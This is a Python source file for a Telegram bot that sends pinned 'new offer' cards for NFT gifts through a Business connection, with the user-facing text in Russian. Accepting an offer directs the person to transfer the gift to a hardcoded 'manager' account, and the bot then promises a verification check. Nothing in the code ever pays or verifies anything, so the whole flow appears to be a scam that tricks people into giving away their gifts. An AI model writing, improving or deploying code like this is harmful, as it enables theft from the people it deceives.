import asyncio
import logging
import os
import re
import secrets
import uuid
from datetime import datetime

import aiosqlite
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.client.default import DefaultBotProperties
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    Update,
)

# -------------------- Configuration --------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не найден! Добавь переменную окружения BOT_TOKEN на Render.")

MANAGER_USERNAME = "Autooffersgift"
MANAGER_LINK = "tg://send_gift?to=Autooffersgift"
STARS_TO_USD = 0.013

PUBLIC_URL = (
    os.getenv("WEBHOOK_BASE_URL")
    or os.getenv("RENDER_EXTERNAL_URL")
    or "https://234554-1.onrender.com"
).rstrip("/")
WEBHOOK_PATH = "/telegram/webhook"
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET") or secrets.token_urlsafe(32)
PORT = int(os.getenv("PORT", "10000"))
DB_PATH = os.getenv("DB_PATH", "offers.db")

logging.basicConfig(
    level=os.getenv("LOG_LEVEL", "INFO"),
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)
log = logging.getLogger("nft-offers")

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()

ALLOWED_UPDATES = [
    "message",
    "callback_query",
    "business_connection",
    "business_message",
]


# -------------------- Database --------------------
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                order_id TEXT UNIQUE,
                gift TEXT,
                amount INTEGER,
                currency TEXT,
                seller_id INTEGER,
                buyer_id INTEGER,
                status TEXT DEFAULT 'pending',
                created_at TEXT,
                message_id INTEGER,
                chat_id INTEGER,
                business_connection_id TEXT,
                source_message_id INTEGER
            )
        """)

        columns = {
            row[1]
            for row in await (await db.execute("PRAGMA table_info(offers)")).fetchall()
        }
        if "business_connection_id" not in columns:
            await db.execute("ALTER TABLE offers ADD COLUMN business_connection_id TEXT")
        if "source_message_id" not in columns:
            await db.execute("ALTER TABLE offers ADD COLUMN source_message_id INTEGER")

        await db.execute("""
            CREATE UNIQUE INDEX IF NOT EXISTS idx_business_source_update
            ON offers (business_connection_id, chat_id, source_message_id)
        """)
        await db.commit()


def generate_order_id() -> str:
    stamp = datetime.now().strftime("%y%m%d%H%M%S")
    return f"TG-{stamp}-{uuid.uuid4().hex[:4].upper()}"


# -------------------- Offer parsing and text --------------------
def parse_offer_command(raw_text: str):
    """Accept slug/URL + amount, optionally currency and language."""
    parts = (raw_text or "").strip().split()
    if parts and parts[0] == "+1":
        parts = parts[1:]

    if len(parts) < 2 or len(parts) > 4:
        return None

    gift = parts[0].strip()
    for prefix in ("https://t.me/nft/", "http://t.me/nft/", "t.me/nft/"):
        if gift.lower().startswith(prefix):
            gift = gift[len(prefix):]
            break

    if not re.fullmatch(r"[A-Za-z0-9_-]+-[0-9]+", gift):
        return None

    if not re.fullmatch(r"[1-9][0-9]{0,17}", parts[1]):
        return None
    amount = int(parts[1])

    currency = "stars"
    language = "ru"

    currency_aliases = {
        "star": "stars",
        "stars": "stars",
        "gram": "grams",
        "grams": "grams",
    }
    languages = {"ru", "en", "zh"}

    if len(parts) >= 3:
        third = parts[2].lower()
        if third in currency_aliases:
            currency = currency_aliases[third]
        elif third in languages:
            language = third
        else:
            return None

    if len(parts) == 4:
        fourth = parts[3].lower()
        if fourth not in languages:
            return None
        language = fourth

    return gift, amount, currency, language


def currency_label(currency: str) -> str:
    return "GRAM" if currency == "grams" else "Stars"


def usd_label(amount: int, currency: str) -> str:
    if currency != "stars":
        return "—"
    return "$" + format(amount * STARS_TO_USD, ",.2f") + " USD"


def make_offer_text(
    gift: str,
    amount: int,
    currency: str,
    buyer_username: str | None = None,
) -> str:
    gift_link = f"https://t.me/nft/{gift}"
    buyer = f"@{buyer_username}" if buyer_username else "Покупатель"
    usd_line = (
        f"\n💵 ≈ <b>{usd_label(amount, currency)}</b>"
        if currency == "stars" else ""
    )

    return (
        "✨ <b>Новое предложение</b> ✨\n\n"
        f"👤 {buyer} хочет купить ваш подарок\n\n"
        f'🎁 <b><a href="{gift_link}">{gift}</a></b>\n\n'
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💎 <b>Сумма предложения</b>\n"
        f"⭐️ <code>{amount}</code> <b>{currency_label(currency)}</b>"
        f"{usd_line}\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "⏳ Офер действует ограниченное время"
    )


def make_accepted_text(
    gift: str,
    amount: int,
    currency: str,
    order_id: str,
) -> str:
    gift_link = f"https://t.me/nft/{gift}"
    usd_line = f" (≈ {usd_label(amount, currency)})" if currency == "stars" else ""

    return (
        "✅ <b>Предложение принято</b>\n\n"
        f'🎁 NFT: <a href="{gift_link}"><b>{gift}</b></a>\n'
        f"💎 Сумма: <code>{amount}</code> {currency_label(currency)}{usd_line}\n"
        f"📄 Заказ: <code>{order_id}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Для завершения сделки нажмите кнопку ниже и передайте подарок менеджеру."
    )


def make_waiting_text(amount: int, currency: str) -> str:
    usd_line = f"\n💵 ≈ <b>{usd_label(amount, currency)}</b>" if currency == "stars" else ""
    return (
        "⏳ <b>Сейчас проверим поступление подарка менеджеру</b>\n\n"
        "Ожидаемое время проверки: <b>до 30 минут</b>\n\n"
        f"💎 Сумма: <code>{amount}</code> {currency_label(currency)}"
        f"{usd_line}"
    )


def offer_keyboard(offer_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline:{offer_id}"),
        ]
    ])


def accepted_keyboard(offer_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать подарок", url=MANAGER_LINK)],
        [InlineKeyboardButton(text="✅ Подтвердить передачу", callback_data=f"confirm_transfer:{offer_id}")],
    ])


# -------------------- Business helpers --------------------
async def get_business_connection_for_message(message):
    connection_id = message.business_connection_id
    if not connection_id:
        return None

    connection = await bot.get_business_connection(
        business_connection_id=connection_id
    )
    rights = connection.rights

    if not connection.is_enabled:
        raise RuntimeError("Business Connection отключено в Telegram.")
    if not rights or rights.can_reply is not True:
        raise RuntimeError(
            "У Business-бота нет права can_reply. Разрешите отправку сообщений в настройках Telegram Business."
        )

    return connection


async def send_to_message_chat(message, text, reply_markup=None, business_connection_id=None):
    kwargs = {
        "chat_id": message.chat.id,
        "text": text,
        "reply_markup": reply_markup,
        "link_preview_options": {"is_disabled": False},
    }
    if business_connection_id:
        kwargs["business_connection_id"] = business_connection_id
    return await bot.send_message(**kwargs)


# -------------------- Incoming messages --------------------
@dp.message(CommandStart())
async def cmd_start(message):
    await message.answer(
        "👋 Бот офферов NFT-подарков запущен.\n\n"
        "Отправьте:\n"
        "<code>SnoopCigar-84846 3200 stars</code>\n\n"
        "Также принимается ссылка t.me/nft и префикс +1."
    )


@dp.business_connection()
async def on_business_connection(connection):
    rights = connection.rights
    log.info(
        "BUSINESS_CONNECTION_UPDATED enabled=%s owner_id=%s can_reply=%s",
        connection.is_enabled,
        connection.user.id if connection.user else None,
        rights.can_reply if rights else None,
    )


async def create_offer_from_message(message, business: bool):
    parsed = parse_offer_command(message.text or "")
    if not parsed:
        return

    gift, amount, currency, language = parsed
    connection_id = message.business_connection_id if business else None
    seller_id = message.chat.id

    if business:
        if message.chat.type != "private":
            log.warning(
                "BUSINESS_OFFER_IGNORED unsupported_chat_type=%s chat_id=%s",
                message.chat.type,
                message.chat.id,
            )
            return
        if not message.from_user:
            log.warning("BUSINESS_OFFER_IGNORED no_sender chat_id=%s", message.chat.id)
            return
        if message.sender_business_bot:
            log.info("BUSINESS_OFFER_IGNORED sent_by_business_bot chat_id=%s", message.chat.id)
            return

        try:
            connection = await get_business_connection_for_message(message)
        except Exception as exc:
            log.error(
                "BUSINESS_OFFER_BLOCKED chat_id=%s connection_id=%s reason=%s",
                message.chat.id,
                connection_id,
                str(exc),
            )
            return

        # The seller types the offer command in the buyer's private chat.
        # For outgoing Business messages, from_user is the seller while chat.id
        # identifies the buyer. Do not discard these owner-authored commands.
        if not connection.user or message.from_user.id != connection.user.id:
            log.info(
                "BUSINESS_OFFER_IGNORED not_owner_command chat_id=%s sender_id=%s owner_id=%s",
                message.chat.id,
                message.from_user.id,
                connection.user.id if connection.user else None,
            )
            return
        seller_id = connection.user.id

    buyer_username = (
        message.chat.username if business
        else (message.from_user.username if message.from_user else None)
    )
    order_id = generate_order_id()
    text = make_offer_text(gift, amount, currency, buyer_username)
    keyboard = offer_keyboard(0)

    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            """INSERT OR IGNORE INTO offers
               (order_id, gift, amount, currency, seller_id, buyer_id, status,
                created_at, message_id, chat_id, business_connection_id, source_message_id)
               VALUES (?, ?, ?, ?, ?, ?, 'queued', ?, NULL, ?, ?, ?)""",
            (
                order_id,
                gift,
                amount,
                currency,
                seller_id,
                message.chat.id if business else (message.from_user.id if message.from_user else None),
                datetime.now().isoformat(),
                message.chat.id,
                connection_id,
                message.message_id if business else None,
            ),
        )
        if cursor.rowcount != 1:
            log.info(
                "DUPLICATE_BUSINESS_MESSAGE_IGNORED chat_id=%s message_id=%s",
                message.chat.id,
                message.message_id,
            )
            return
        offer_db_id = cursor.lastrowid
        await db.commit()

    keyboard = offer_keyboard(offer_db_id)

    try:
        sent = await send_to_message_chat(
            message,
            text,
            reply_markup=keyboard,
            business_connection_id=connection_id,
        )
    except Exception as exc:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "UPDATE offers SET status = 'failed' WHERE id = ?",
                (offer_db_id,),
            )
            await db.commit()
        log.exception(
            "OFFER_SEND_FAILED order_id=%s chat_id=%s business=%s error=%s",
            order_id,
            message.chat.id,
            bool(connection_id),
            str(exc),
        )
        return

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE offers SET message_id = ?, status = 'pending' WHERE id = ?",
            (sent.message_id, offer_db_id),
        )
        await db.commit()

    try:
        await bot.pin_chat_message(
            chat_id=message.chat.id,
            message_id=sent.message_id,
            business_connection_id=connection_id,
            disable_notification=True,
        )
    except Exception as exc:
        log.warning(
            "OFFER_PIN_FAILED order_id=%s chat_id=%s error=%s",
            order_id,
            message.chat.id,
            str(exc),
        )

    log.info(
        "OFFER_DELIVERED order_id=%s offer_id=%s chat_id=%s message_id=%s business=%s",
        order_id,
        offer_db_id,
        message.chat.id,
        sent.message_id,
        bool(connection_id),
    )


@dp.message(F.text)
async def create_regular_offer(message):
    await create_offer_from_message(message, business=False)


@dp.business_message(F.text)
async def create_business_offer(message):
    log.info(
        "BUSINESS_MESSAGE_RECEIVED connection_id=%s chat_id=%s message_id=%s",
        message.business_connection_id,
        message.chat.id,
        message.message_id,
    )
    await create_offer_from_message(message, business=True)


# -------------------- Offer callbacks --------------------
async def load_offer(offer_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute("SELECT * FROM offers WHERE id = ?", (offer_id,))
        return await cursor.fetchone()


@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    try:
        offer_id = int(callback.data.split(":", 1)[1])
    except (ValueError, IndexError):
        await callback.answer("Некорректный номер оффера", show_alert=True)
        return

    offer = await load_offer(offer_id)
    if not offer or offer["status"] != "pending":
        await callback.answer("Оффер уже обработан или не найден", show_alert=True)
        return

    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            "UPDATE offers SET status = 'accepted' WHERE id = ? AND status = 'pending'",
            (offer_id,),
        )
        await db.commit()
        if cursor.rowcount != 1:
            await callback.answer("Оффер уже обработан", show_alert=True)
            return

    text = make_accepted_text(
        offer["gift"],
        offer["amount"],
        offer["currency"],
        offer["order_id"],
    )
    keyboard = accepted_keyboard(offer_id)

    try:
        await bot.edit_message_text(
            chat_id=offer["chat_id"],
            message_id=offer["message_id"],
            text=text,
            reply_markup=keyboard,
            business_connection_id=offer["business_connection_id"],
        )
        await bot.pin_chat_message(
            chat_id=offer["chat_id"],
            message_id=offer["message_id"],
            business_connection_id=offer["business_connection_id"],
            disable_notification=True,
        )
        await callback.answer("✅ Предложение принято")
    except Exception as exc:
        log.exception("OFFER_ACCEPT_EDIT_FAILED offer_id=%s error=%s", offer_id, str(exc))
        await callback.answer(
            "Статус сохранён, но сообщение не удалось обновить. Обратитесь к администратору.",
            show_alert=True,
        )


@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):
    try:
        offer_id = int(callback.data.split(":", 1)[1])
    except (ValueError, IndexError):
        await callback.answer("Некорректный номер оффера", show_alert=True)
        return

    offer = await load_offer(offer_id)
    if not offer or offer["status"] != "pending":
        await callback.answer("Оффер уже обработан или не найден", show_alert=True)
        return

    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            "UPDATE offers SET status = 'declined' WHERE id = ? AND status = 'pending'",
            (offer_id,),
        )
        await db.commit()
        if cursor.rowcount != 1:
            await callback.answer("Оффер уже обработан", show_alert=True)
            return

    try:
        await bot.edit_message_text(
            chat_id=offer["chat_id"],
            message_id=offer["message_id"],
            text="❌ Предложение отклонено",
            reply_markup=None,
            business_connection_id=offer["business_connection_id"],
        )
        await callback.answer("Предложение отклонено")
    except Exception as exc:
        log.exception("OFFER_DECLINE_EDIT_FAILED offer_id=%s error=%s", offer_id, str(exc))
        await callback.answer("Предложение отклонено", show_alert=True)


@dp.callback_query(F.data.startswith("confirm_transfer:"))
async def confirm_transfer(callback: CallbackQuery):
    try:
        offer_id = int(callback.data.split(":", 1)[1])
    except (ValueError, IndexError):
        await callback.answer("Некорректный номер оффера", show_alert=True)
        return

    offer = await load_offer(offer_id)
    if not offer or offer["status"] != "accepted":
        await callback.answer("Сначала нужно принять оффер", show_alert=True)
        return

    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            "UPDATE offers SET status = 'transfer_marked' WHERE id = ? AND status = 'accepted'",
            (offer_id,),
        )
        await db.commit()
        if cursor.rowcount != 1:
            await callback.answer("Передача уже отмечена", show_alert=True)
            return

    try:
        await bot.send_message(
            chat_id=offer["chat_id"],
            text=make_waiting_text(offer["amount"], offer["currency"]),
            business_connection_id=offer["business_connection_id"],
        )
        await callback.answer("Ожидаем поступление подарка")
    except Exception as exc:
        log.exception("TRANSFER_NOTICE_FAILED offer_id=%s error=%s", offer_id, str(exc))
        await callback.answer(
            "Статус сохранён, но уведомление не отправлено.",
            show_alert=True,
        )


# -------------------- Webhook and health server --------------------
async def health_handler(request):
    return web.json_response({
        "service": "Telegram NFT Offers",
        "status": "running",
        "mode": "webhook",
    })


async def telegram_webhook(request):
    supplied_secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if not secrets.compare_digest(supplied_secret, WEBHOOK_SECRET):
        return web.Response(status=403, text="Forbidden")

    try:
        payload = await request.json()
        update = Update.model_validate(payload, context={"bot": bot})

        if update.business_message:
            event_type = "business_message"
        elif update.business_connection:
            event_type = "business_connection"
        elif update.callback_query:
            event_type = "callback_query"
        elif update.message:
            event_type = "message"
        else:
            event_type = "other"

        log.info("WEBHOOK_UPDATE_RECEIVED type=%s update_id=%s", event_type, update.update_id)
        await dp.feed_update(bot, update)
        return web.Response(text="OK")
    except Exception:
        log.exception("WEBHOOK_UPDATE_PROCESSING_FAILED")
        return web.Response(status=500, text="Update processing failed")


async def start_web_server():
    if not PUBLIC_URL.startswith("https://"):
        raise RuntimeError(
            "Для webhook требуется HTTPS. Проверь RENDER_EXTERNAL_URL или WEBHOOK_BASE_URL."
        )

    app = web.Application(client_max_size=1_000_000)
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    app.router.add_post(WEBHOOK_PATH, telegram_webhook)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info("WEB_SERVER_STARTED port=%s", PORT)

    webhook_url = PUBLIC_URL + WEBHOOK_PATH
    await bot.set_webhook(
        url=webhook_url,
        secret_token=WEBHOOK_SECRET,
        allowed_updates=ALLOWED_UPDATES,
        drop_pending_updates=False,
    )
    webhook_info = await bot.get_webhook_info()
    log.info(
        "WEBHOOK_CONFIGURED url=%s pending_updates=%s last_error_date=%s",
        webhook_info.url,
        webhook_info.pending_update_count,
        webhook_info.last_error_date,
    )

    try:
        await asyncio.Event().wait()
    finally:
        await runner.cleanup()


async def main():
    await init_db()
    log.info("Starting Telegram NFT Offers in webhook mode")
    try:
        await start_web_server()
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
